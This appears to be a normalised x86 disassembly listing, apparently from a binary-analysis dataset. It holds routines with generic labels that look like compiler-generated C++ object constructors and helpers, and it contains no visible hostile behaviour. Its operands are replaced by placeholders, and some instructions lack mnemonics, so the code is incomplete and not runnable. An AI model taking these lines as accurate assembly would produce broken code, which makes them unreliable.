call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_42031b
push 0x4
mov eax sub_44a9fd
call sub_448595
mov edi [ ebp + 0x8 ]
lea eax [ edi + 0x4 ]
mov esi ebx
mov [ edi ] 0x1
mov [ ebp - 0x10 ] eax
call sub_4212c7
lea ecx [ eax + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_4210f3
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_4212c7
add eax 0x1c
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_42039c
push 0x4
mov eax sub_44a9d7
call sub_448595
mov edi [ ebp + 0x8 ]
lea eax [ edi + 0x4 ]
mov esi ebx
mov [ edi ] 0x1
mov [ ebp - 0x10 ] eax
call sub_4212e6
lea ecx [ eax + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_42110b
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_4212e6
add eax 0x1c
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_42041d
push 0x4
mov eax sub_44a9b1
call sub_448595
mov edi [ ebp + 0x8 ]
lea eax [ edi + 0x4 ]
mov esi ebx
mov [ edi ] 0x1
mov [ ebp - 0x10 ] eax
call sub_421305
lea ecx [ eax + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_421123
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_421305
add eax 0x1c
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_42049e
push 0x4
mov eax sub_44a98b
call sub_448595
mov edi [ ebp + 0x8 ]
lea eax [ edi + 0x4 ]
mov esi ebx
mov [ edi ] 0x1
mov [ ebp - 0x10 ] eax
call sub_421324
lea ecx [ eax + 0x8 ]
mov eax [ ebp - 0x10 ]
call sub_42113b
mov [ edi + 0x8 ] 0x2
mov eax [ ebx ]
test eax eax
je r-xdata
mov [ edi + 0xc ] eax
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
and [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor edx edx
lea ecx [ eax + 0x4 ]
inc edx
[ ecx ] edx
mov esi ebx
call sub_421324
add eax 0x1c
mov [ edi + 0x10 ] eax
and [ edi + 0x14 ] 0x0
and [ edi + 0x18 ] 0x0
mov eax edi
call sub_44866d
retn 0x4
lea esi [ eax + 0x4 ]
call sub_40c2c3
sub_420522
push ebp
mov ebp esp
sub eax [ ebp + 0x8 ]
push esi
sar eax 0x1
lea esi [ eax + eax ]
push esi
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_424b60
add esp 0xc
add eax esi
pop esi
pop ebp
retn
sub_420542
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov eax [ esi + 0x14 ]
cmp eax 0x10
jb r-xdata
push 0x21
push r--data
push r--data
call sub_4258e2
add esp 0xc
mov edx [ esi + 0x10 ]
sub edx ecx
add edx eax
jns r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov eax [ esi + 0x10 ]
sub eax edx
add eax ecx
retn
sub_4205c5
push ebp
mov ebp esp
mov ecx [ esi + 0x204 ]
push edi
push [ ebp + 0x8 ]
mov edi eax
mov eax [ ecx ]
call [ eax + 0x8 ]
movzx eax al
call sub_411fdc
test al al
jne r-xdata
xor eax eax
inc eax
cmp [ edi + 0x21 ] al
je r-xdata
xor eax eax
jmp r-xdata
mov dl [ ebp + 0x8 ]
mov ecx esi
mov eax edi
call sub_420f77
test al al
jne r-xdata
movzx ecx [ edi + 0x20 ]
xor edx edx
cmp ecx eax
setne al
pop edi
pop ebp
retn 0x8
sub_420611
push ebp
mov ebp esp
push edi
mov edi eax
movzx eax [ ebp + 0x8 ]
call sub_411fdc
test al al
jne r-xdata
xor eax eax
inc eax
cmp [ edi + 0x21 ] al
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov dl [ ebp + 0x8 ]
mov eax edi
call sub_420f77
test al al
jne r-xdata
movzx ecx [ edi + 0x20 ]
xor edx edx
cmp ecx eax
setne al
pop edi
pop ebp
retn 0xc
sub_420651
push 0x8
mov eax sub_44b775
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0x40
call sub_424ff8
pop ecx
test eax eax
je r-xdata
xor esi esi
mov edx [ ebp + 0xc ]
mov esi eax
call sub_421385
mov esi eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_422139
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_4206ba
push 0x8
mov eax sub_44b739
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0x40
call sub_424ff8
pop ecx
test eax eax
je r-xdata
xor esi esi
mov edx [ ebp + 0xc ]
mov esi eax
call sub_421452
mov esi eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_4221ba
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_420723
push 0x8
mov eax sub_44b6fd
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0x40
call sub_424ff8
pop ecx
test eax eax
je r-xdata
xor esi esi
mov edx [ ebp + 0xc ]
mov esi eax
call sub_42151f
mov esi eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_42223b
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_42078c
push 0x8
mov eax sub_44b6c1
call sub_448595
and [ ebp - 0x14 ] 0x0
push 0x40
call sub_424ff8
pop ecx
test eax eax
je r-xdata
xor esi esi
mov edx [ ebp + 0xc ]
mov esi eax
call sub_4215ec
mov esi eax
jmp r-xdata
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_4222bc
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
mov ecx edi
[ eax ] ecx
xor edi edi
inc edi
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_4207f5
push 0x8
mov eax sub_44cee9
call sub_448595
xor esi esi
push 0x58
mov [ ebp - 0x14 ] esi
call sub_424ff8
pop ecx
mov [ ebp - 0x10 ] eax
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp eax esi
je r-xdata
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov esi [ ebp + 0xc ]
mov edi eax
call sub_4216b9
mov esi eax
mov [ ebp - 0x4 ] 0x2
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_42233d
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
[ eax ] ebx
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_420867
push 0x8
mov eax sub_44cea3
call sub_448595
xor esi esi
push 0x58
mov [ ebp - 0x14 ] esi
call sub_424ff8
pop ecx
mov [ ebp - 0x10 ] eax
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp eax esi
je r-xdata
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov esi [ ebp + 0xc ]
mov edi eax
call sub_421787
mov esi eax
mov [ ebp - 0x4 ] 0x2
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_4223be
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
[ eax ] ebx
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_4208d9
push 0x8
mov eax sub_44ce5d
call sub_448595
xor esi esi
push 0x58
mov [ ebp - 0x14 ] esi
call sub_424ff8
pop ecx
mov [ ebp - 0x10 ] eax
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp eax esi
je r-xdata
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov esi [ ebp + 0xc ]
mov edi eax
call sub_421857
mov esi eax
mov [ ebp - 0x4 ] 0x2
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_42243f
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
[ eax ] ebx
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_42094b
push 0x8
mov eax sub_44ce17
call sub_448595
xor esi esi
push 0x58
mov [ ebp - 0x14 ] esi
call sub_424ff8
pop ecx
mov [ ebp - 0x10 ] eax
xor ebx ebx
inc ebx
mov [ ebp - 0x4 ] ebx
cmp eax esi
je r-xdata
mov [ ebp - 0x10 ] esi
test esi esi
je r-xdata
mov esi [ ebp + 0xc ]
mov edi eax
call sub_421924
mov esi eax
mov [ ebp - 0x4 ] 0x2
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x10 ]
call sub_4224c0
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
lea eax [ esi + 0x4 ]
[ eax ] ebx
mov eax [ ebp + 0x8 ]
call sub_44866d
retn
add esi 0x4
call sub_40c2c3
sub_4209bd
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_422541
pop edi
leave
retn 0x8
sub_4209dc
push ebp
mov ebp esp
push ecx
push edi
mov edi ecx
cmp [ edi + 0x28 ] 0x1
jne r-xdata
cmp [ edi + 0x20 ] 0x0
je r-xdata
inc [ eax + 0x1c ]
cmp [ eax + 0x1c ] 0x0
setg cl
mov [ edi + 0x2c ] cl
mov eax [ eax ]
call sub_408952
lea ecx [ ebp - 0x1 ]
push ecx
call sub_41901c
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop edi
leave
retn 0x4
sub_420a16
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_4225ee
pop edi
leave
retn 0x8
sub_420a35
push ebp
mov ebp esp
push ecx
push edi
mov edi ecx
cmp [ edi + 0x20 ] 0x0
je r-xdata
mov eax [ eax ]
call sub_408952
lea ecx [ ebp - 0x1 ]
push ecx
call sub_41901c
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop edi
leave
retn 0x4
sub_420a5c
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_422666
pop edi
leave
retn 0x8
sub_420a7b
push ebp
mov ebp esp
push ecx
push edi
mov edi ecx
cmp [ edi + 0x28 ] 0x1
jne r-xdata
cmp [ edi + 0x20 ] 0x0
je r-xdata
inc [ eax + 0x1c ]
cmp [ eax + 0x1c ] 0x0
setg cl
mov [ edi + 0x2c ] cl
mov eax [ eax ]
call sub_408952
lea ecx [ ebp - 0x1 ]
push ecx
call sub_4190b3
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop edi
leave
retn 0x4
sub_420ab5
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_422711
pop edi
leave
retn 0x8
sub_420ad4
push ebp
mov ebp esp
push ecx
push edi
mov edi ecx
cmp [ edi + 0x20 ] 0x0
je r-xdata
mov eax [ eax ]
call sub_408952
lea ecx [ ebp - 0x1 ]
push ecx
call sub_4190b3
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop edi
leave
retn 0x4
sub_420afb
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov edi [ ebp + 0xc ]
push [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
call sub_422789
pop edi
leave
retn 0xc
sub_420b1d
push ebp
mov ebp esp
cmp [ ecx + 0xc ] 0x1
jne r-xdata
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
inc [ eax + 0x1c ]
cmp [ eax + 0x1c ] 0x0
setg dl
mov [ ecx + 0x10 ] dl
sub_420b41
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov edi [ ebp + 0xc ]
push [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
call sub_422812
pop edi
leave
retn 0xc
sub_420b74
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_42288a
pop edi
leave
retn 0x8
sub_420b93
push ebp
mov ebp esp
cmp [ ecx + 0xc ] 0x1
jne r-xdata
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
inc [ eax + 0x1c ]
cmp [ eax + 0x1c ] 0x0
setg dl
mov [ ecx + 0x10 ] dl
sub_420bb7
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_422913
pop edi
leave
retn 0x8
sub_420be7
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_42298b
pop edi
leave
retn 0x4
sub_420c03
push ebp
mov ebp esp
cmp [ ecx + 0xc ] 0x1
jne r-xdata
mov eax [ eax ]
call sub_408952
mov eax [ ebp + 0x8 ]
pop ebp
retn 0x4
inc [ eax + 0x1c ]
cmp [ eax + 0x1c ] 0x0
setg dl
mov [ ecx + 0x10 ] dl
sub_420c27
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_422a3d
pop edi
leave
retn 0x8
sub_420c57
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_422ab1
pop edi
leave
retn 0x8
sub_420c76
push ebp
mov ebp esp
push ecx
cmp [ ecx + 0xc ] 0x1
jne r-xdata
cmp [ ecx + 0x4 ] 0x0
je r-xdata
inc [ eax + 0x1c ]
cmp [ eax + 0x1c ] 0x0
setg dl
mov [ ecx + 0x10 ] dl
mov eax [ eax ]
call sub_408952
push ecx
lea ecx [ ebp - 0x1 ]
push ecx
call sub_419664
jmp r-xdata
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_420cad
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov edi [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_422b6a
pop edi
leave
retn 0x8
sub_420ccc
push ebp
mov ebp esp
push ecx
cmp [ ecx + 0x4 ] 0x0
je r-xdata
mov eax [ eax ]
call sub_408952
push ecx
lea ecx [ ebp - 0x1 ]
push ecx
call sub_419664
jmp r-xdata
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_420cf0
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov edi [ ebp + 0xc ]
push [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
call sub_422c0f
pop edi
leave
retn 0xc
sub_420d12
push ebp
mov ebp esp
push ecx
cmp [ ecx + 0xc ] 0x1
jne r-xdata
cmp [ ecx + 0x4 ] 0x0
je r-xdata
inc [ eax + 0x1c ]
cmp [ eax + 0x1c ] 0x0
setg dl
mov [ ecx + 0x10 ] dl
mov eax [ eax ]
call sub_408952
push ecx
lea ecx [ ebp - 0x1 ]
push ecx
call sub_4196b1
jmp r-xdata
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_420d49
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov edi [ ebp + 0xc ]
push [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
call sub_422ca7
pop edi
leave
retn 0xc
sub_420d6b
push ebp
mov ebp esp
push ecx
cmp [ ecx + 0x4 ] 0x0
je r-xdata
mov eax [ eax ]
call sub_408952
push ecx
lea ecx [ ebp - 0x1 ]
push ecx
call sub_4196b1
jmp r-xdata
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_420d8f
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov edi [ ebp + 0xc ]
push [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
call sub_422d1f
pop edi
leave
retn 0xc
sub_420db1
push ebp
mov ebp esp
push ecx
push edi
mov edi ecx
cmp [ edi + 0xc ] 0x1
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
inc [ eax + 0x1c ]
cmp [ eax + 0x1c ] 0x0
setg cl
mov [ edi + 0x10 ] cl
mov eax [ eax ]
call sub_408952
lea ecx [ ebp - 0x1 ]
push ecx
call sub_419717
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop edi
leave
retn 0x4
sub_420deb
push ebp
mov ebp esp
push ecx
push edi
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov edi [ ebp + 0xc ]
push [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
call sub_422db4
pop edi
leave
retn 0xc
sub_420e0d
push ebp
mov ebp esp
push ecx
push edi
mov edi ecx
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ eax ]
call sub_408952
lea ecx [ ebp - 0x1 ]
push ecx
call sub_419717
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop edi
leave
retn 0x4
sub_420eab
push ebp
mov ebp esp
sub esp 0x10
cmp eax 0xaaaaaaa
ja r-xdata
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
call sub_4252f8
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_426f77
imul eax eax 0x18
push eax
call sub_424ff8
pop ecx
test eax eax
jne r-xdata
leave
retn
sub_420f23
push ebp
mov ebp esp
push esi
mov esi eax
call sub_420f42
mov ecx [ ebp + 0x8 ]
mov esi eax
lea eax [ esi + 0xc ]
call sub_422ed4
mov eax esi
pop esi
pop ebp
retn 0x4
sub_420f77
push ebp
mov ebp esp
push ecx
push ecx
mov [ ebp - 0x8 ] dl
movzx edx dl
mov dx [ ecx + edx * 2 ]
and dx [ eax + 0x22 ]
push esi
xor esi esi
cmp si dx
jne r-xdata
xor eax eax
inc eax
mov esi [ eax + 0x28 ]
mov eax [ eax + 0x24 ]
push ecx
push [ ebp - 0x8 ]
push esi
call sub_423c9a
add esp 0xc
cmp esi eax
jne r-xdata
xor eax eax
jmp r-xdata
pop esi
leave
retn
sub_421343
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
je r-xdata
pop ebp
retn 0xc
push edi
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
call sub_41e6f8
dec [ ebp + 0x10 ]
jne r-xdata
pop edi
sub_421385
lea eax [ esi + 0x8 ]
call sub_421a47
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0x38 ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_4213b2
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
push edi
lea esi [ ebx + 0x38 ]
call sub_407804
mov ecx eax
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
push ecx
lea ecx [ ebx + 0x8 ]
call sub_4235b5
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_4213f6
push ebp
mov ebp esp
test ecx ecx
je r-xdata
xor eax eax
lea eax [ ecx + 0x8 ]
jmp r-xdata
lea ecx [ ebp + 0xb ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_422f39
pop ebp
retn 0x4
sub_421452
lea eax [ esi + 0x8 ]
call sub_421a8d
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0x38 ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_42147f
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
push edi
lea esi [ ebx + 0x38 ]
call sub_407804
mov ecx eax
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
push ecx
lea ecx [ ebx + 0x8 ]
call sub_42364f
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_4214c3
push ebp
mov ebp esp
test ecx ecx
je r-xdata
xor eax eax
lea eax [ ecx + 0x8 ]
jmp r-xdata
lea ecx [ ebp + 0xb ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_422f8f
pop ebp
retn 0x4
sub_42151f
lea eax [ esi + 0x8 ]
call sub_421ad3
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0x38 ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_42154c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
push edi
lea esi [ ebx + 0x38 ]
call sub_407804
mov ecx eax
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
push ecx
lea ecx [ ebx + 0x8 ]
call sub_4236c7
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_421590
push ebp
mov ebp esp
test ecx ecx
je r-xdata
xor eax eax
lea eax [ ecx + 0x8 ]
jmp r-xdata
lea ecx [ ebp + 0xb ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_422fd2
pop ebp
retn 0x4
sub_4215ec
lea eax [ esi + 0x8 ]
call sub_421b19
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ esi + 0x38 ] eax
test eax eax
je r-xdata
mov eax esi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_421619
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
push edi
lea esi [ ebx + 0x38 ]
call sub_407804
mov ecx eax
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
push ecx
lea ecx [ ebx + 0x8 ]
call sub_423761
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_42165d
push ebp
mov ebp esp
test ecx ecx
je r-xdata
xor eax eax
lea eax [ ecx + 0x8 ]
jmp r-xdata
lea ecx [ ebp + 0xb ]
push ecx
mov ecx [ ebp + 0x8 ]
call sub_423028
pop ebp
retn 0x4
sub_4216b9
lea eax [ edi + 0x8 ]
call sub_421b5f
and [ edi + 0x4 ] 0x0
mov [ edi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ edi + 0x50 ] eax
test eax eax
je r-xdata
mov eax edi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_4216e6
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
push edi
lea esi [ ebx + 0x50 ]
call sub_407804
mov ecx eax
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
add ebx 0x8
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
call sub_4237d9
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_42172b
push ebp
mov ebp esp
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x8
jmp r-xdata
lea eax [ ebp + 0xb ]
push eax
mov eax [ ebp + 0x8 ]
call sub_42306b
pop ebp
retn 0x4
sub_421787
lea eax [ edi + 0x8 ]
call sub_421ba5
and [ edi + 0x4 ] 0x0
mov [ edi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ edi + 0x50 ] eax
test eax eax
je r-xdata
mov eax edi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_4217b4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
push edi
lea esi [ ebx + 0x50 ]
call sub_407804
mov ecx eax
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
add ebx 0x8
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
call sub_4238a6
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_4217f9
push ebp
mov ebp esp
test ecx ecx
je r-xdata
xor eax eax
lea eax [ ecx + 0x8 ]
jmp r-xdata
cmp [ eax + 0x38 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_408952
pop ebp
retn 0x4
sub_421857
lea eax [ edi + 0x8 ]
call sub_421beb
and [ edi + 0x4 ] 0x0
mov [ edi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ edi + 0x50 ] eax
test eax eax
je r-xdata
mov eax edi
retn
xor ecx ecx
add eax 0x4
inc ecx
[ eax ] ecx
sub_421884
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx ecx
push edi
lea esi [ ebx + 0x50 ]
call sub_407804
mov esi [ ebp + 0x8 ]
mov ecx eax
xor eax eax
lea edi [ ebp - 0x4 ]
stosb [ edi ]
push [ ebp - 0x4 ]
add ebx 0x8
push ecx
call sub_42396c
pop edi
pop esi
pop ebx
leave
retn 0x4
sub_4218c8
push ebp
mov ebp esp
test ecx ecx
je r-xdata
xor ecx ecx
add ecx 0x8
jmp r-xdata
lea eax [ ebp + 0xb ]
push eax
mov eax [ ebp + 0x8 ]
call sub_4230db
pop ebp
retn 0x4
sub_421924
lea eax [ edi + 0x8 ]
call sub_421c31
and [ edi + 0x4 ] 0x0
mov [ edi ] r--data
call sub_40dcdf
mov eax [ eax ]
mov [ edi + 0x50 ] eax
test eax eax
je r-xdata
mov eax edi
retn
xor ecx ecx
add eax 0x4
inc ecx
